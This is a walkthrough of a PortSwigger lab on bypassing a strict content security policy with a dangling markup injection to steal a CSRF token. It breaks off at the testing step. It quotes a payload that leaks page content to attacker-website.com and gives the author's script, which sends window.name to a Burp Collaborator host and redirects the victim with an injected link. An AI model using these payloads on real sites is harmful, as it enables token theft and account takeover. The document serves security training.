# Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

 This lab using a strict CSP that blocks outgoing requests to external web sites.

To solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to hacker@evil-user.net.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example: 

```html
<a href="">Click me</a>
```
 You can log in to your own account using the following credentials: wiener:peter 
 
 ## Notes from portswigger
 
  Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.

Suppose an application embeds attacker-controllable data into its responses in an unsafe way: 

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```
Suppose also that the application does not filter or escape the > or " characters. An attacker can use the following syntax to break out of the quoted attribute value and the enclosing tag, and return to an HTML context: 

```html
">
```
In this situation, an attacker would naturally attempt to perform XSS. But suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following: 

```html
"><img src='//attacker-website.com?
```
 This payload creates an img tag and defines the start of a src attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the src attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.

The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.

Any attribute that makes an external request can be used for dangling markup.

This next lab is difficult to solve because all external requests are blocked. However, there are certain tags that allow you to store data and retrieve it from an external server later. Solving this lab might require user interaction. 

# Step 1 login as wiener:peter and intercept the change email request:

![image](https://user-images.githubusercontent.com/83407557/211396821-d9c1596e-e74e-45c0-976a-ca7536ff5b25.png)


See that there is a CSRF token

![image](https://user-images.githubusercontent.com/83407557/211396866-fe7c89ca-5474-4466-b596-d5381870c9e2.png)

# step 2 Create an exploit to steal CSRF token

Getting my collaborator URL:

![image](https://user-images.githubusercontent.com/83407557/211396178-8d5ad537-dbfb-4853-a345-695f49bf181d.png)

```
vvudmkpebqf3bg8jyxi5zcy5ww2nqde2.oastify.com
```
And the lab URL

```
https://0a0a009003b91385c79d6e6600b10009.web-security-academy.net/my-account
```

And the my exploit server URL:



I create the following payload to send to the victim:

```html
<script>
if(window.name) {
	new Image().src='//vvudmkpebqf3bg8jyxi5zcy5ww2nqde2.oastify.com?'+encodeURIComponent(window.name);
	} else {
		location = "https://0a0a009003b91385c79d6e6600b10009.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a6c008b033813c8c7626d19014e004d.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

I then add this exploit to my exploit server:

![image](https://user-images.githubusercontent.com/83407557/211397627-836ed611-efdd-4379-90d4-79fd052be058.png)

# Step 3 Test exploit



